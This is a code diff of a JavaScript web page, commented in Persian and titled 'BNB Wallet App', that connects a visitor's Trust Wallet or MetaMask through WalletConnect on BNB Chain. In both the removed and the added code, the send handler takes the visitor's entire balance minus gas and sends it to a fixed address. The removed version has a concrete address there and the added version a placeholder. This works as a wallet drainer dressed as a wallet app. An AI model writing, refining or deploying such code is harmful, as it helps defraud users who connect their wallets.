@@ -1,116 +1,100 @@
-import { ethers } from "ethers";
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
+import { ethers } from "ethers";
 
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID
-const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // آدرس مقصد
+const projectId = "YOUR_PROJECT_ID"; // WalletConnect Project ID
+const TO_ADDRESS = "0xYourRecipientAddressHere"; // ← آدرس مقصد BNB
+const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+
+let userAddress = null;
+let currentWallet = null; // 'trust' یا 'metamask'
 
 const modal = new WalletConnectModalSign({
   projectId,
   metadata: {
     name: "BNB Wallet App",
-    description: "Send BNB with WalletConnect",
-    url: "http://localhost",
-    icons: ["https://walletconnect.com/walletconnect-logo.png"],
-  },
-  explorerRecommendedWalletIds: ["trust", "metamask"],
-  mobileWallets: [
-    {
-      id: "trust",
-      name: "Trust Wallet",
-      homepage: "https://trustwallet.com",
-      universalLink: "https://link.trustwallet.com/wc",
-      nativeLink: "trust://"
-    },
-    {
-      id: "metamask",
-      name: "MetaMask",
-      homepage: "https://metamask.io",
-      universalLink: "https://metamask.app.link/wc",
-      nativeLink: "metamask://"
-    }
-  ]
-});
-
-const connectBtn = document.getElementById("connectBtn");
-const sendBtn = document.getElementById("sendBtn");
-const addressSpan = document.getElementById("address");
-const balanceSpan = document.getElementById("balance");
-
-let session;
-let userAddress;
-
-connectBtn.addEventListener("click", async () => {
-  try {
-    session = await modal.connect({
-      requiredNamespaces: {
-        eip155: {
-          methods: [
-            "eth_sendTransaction",
-            "eth_sign",
-            "personal_sign",
-            "eth_signTransaction",
-            "eth_signTypedData"
-          ],
-          chains: ["eip155:56"],
-          events: ["chainChanged", "accountsChanged"],
-        },
-      },
-    });
-
-    const account = session.namespaces.eip155.accounts[0];
-    userAddress = account.split(":")[2];
-    addressSpan.textContent = userAddress;
-
-    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-    const balance = await rpc.getBalance(userAddress);
-    const bnb = ethers.formatEther(balance);
-    balanceSpan.textContent = `${bnb} BNB`;
-
-  } catch (err) {
-    console.error("Connection error:", err);
+    description: "Direct send with deeplink",
+    url: "https://yourdomain.com",
+    icons: ["https://walletconnect.com/walletconnect-logo.png"]
   }
 });
 
-sendBtn.addEventListener("click", async () => {
-  if (!session || !userAddress) {
-    alert("Please connect your wallet first.");
+document.getElementById("connectTrust").addEventListener("click", async () => {
+  currentWallet = "trust";
+  await connectWallet("https://link.trustwallet.com/wc?uri=");
+});
+
+document.getElementById("connectMetaMask").addEventListener("click", async () => {
+  currentWallet = "metamask";
+  await connectWallet("https://metamask.app.link/wc?uri=");
+});
+
+async function connectWallet(baseLink) {
+  try {
+    const { uri, approval } = await modal.signClient.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction"],
+          chains: ["eip155:56"],
+          events: ["accountsChanged", "chainChanged"]
+        }
+      }
+    });
+
+    if (uri) {
+      window.location.href = `${baseLink}${encodeURIComponent(uri)}`;
+    }
+
+    const session = await approval();
+    const address = session.namespaces.eip155.accounts[0].split(":")[2];
+    userAddress = address;
+
+    document.getElementById("address").textContent = address;
+
+    const balance = await provider.getBalance(address);
+    document.getElementById("balance").textContent = `${ethers.formatEther(balance)} BNB`;
+
+    document.getElementById("sendBtn").disabled = false;
+
+  } catch (err) {
+    console.error("Connection error:", err);
+    alert("Connection failed.");
+  }
+}
+
+document.getElementById("sendBtn").addEventListener("click", async () => {
+  if (!userAddress || !currentWallet) {
+    alert("Wallet not connected.");
     return;
   }
 
   try {
-    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-    const balance = await rpc.getBalance(userAddress);
+    const balance = await provider.getBalance(userAddress);
 
     const gasLimit = 21000n;
-    const gasPrice = await rpc.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
+    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
     const fee = gasLimit * gasPrice;
     const amountToSend = balance - fee;
 
     if (amountToSend <= 0n) {
-      alert("Not enough BNB to send.");
+      alert("Insufficient BNB.");
       return;
     }
 
-    const tx = {
-      from: userAddress,
-      to: TO_ADDRESS,
-      value: ethers.toBeHex(amountToSend),  // اصلاح شده
-      gas: ethers.toBeHex(gasLimit),
-      gasPrice: ethers.toBeHex(gasPrice)
-    };
+    const amountBNB = ethers.formatEther(amountToSend);
+    const amountWei = amountToSend.toString();
 
-    const result = await modal.request({
-      topic: session.topic,
-      chainId: "eip155:56",
-      request: {
-        method: "eth_sendTransaction",
-        params: [tx],
-      },
-    });
+    let deeplink = "";
 
-    alert(`Transaction sent!\nTx Hash: ${result}`);
+    if (currentWallet === "trust") {
+      deeplink = `https://link.trustwallet.com/send?address=${TO_ADDRESS}&amount=${amountBNB}&asset=BNB`;
+    } else if (currentWallet === "metamask") {
+      deeplink = `https://metamask.app.link/send/${TO_ADDRESS}@56?value=${amountWei}`;
+    }
+
+    window.location.href = deeplink;
+
   } catch (err) {
-    console.error("Send failed:", err);
-    alert("Transaction failed: " + (err.message || err));
+    console.error("Send error:", err);
+    alert("Send failed: " + err.message);
   }
 });
